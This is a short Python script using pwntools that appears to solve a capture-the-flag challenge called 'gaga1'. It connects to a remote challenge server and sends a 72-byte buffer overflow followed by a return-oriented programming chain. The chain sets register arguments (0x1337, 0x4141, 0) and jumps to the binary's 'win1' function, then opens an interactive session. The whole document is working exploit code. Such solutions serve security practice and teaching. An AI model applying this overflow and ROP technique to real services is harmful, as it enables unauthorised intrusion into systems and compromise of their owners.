from pwn import *

e = ELF("./gaga1")
libc = ELF("./libc.so.6")

context.terminal=["konsole", "-e"]

p = remote("challs.actf.co", 31301)
# p = process(["./gaga1"])

p.sendlineafter(": ", "A"*(56+16) + p64(0x00000000004013b3) + p64(0x1337) + p64(0x00000000004013b1) + p64(0x4141) + p64(0) + p64(e.sym["win1"]))


p.interactive()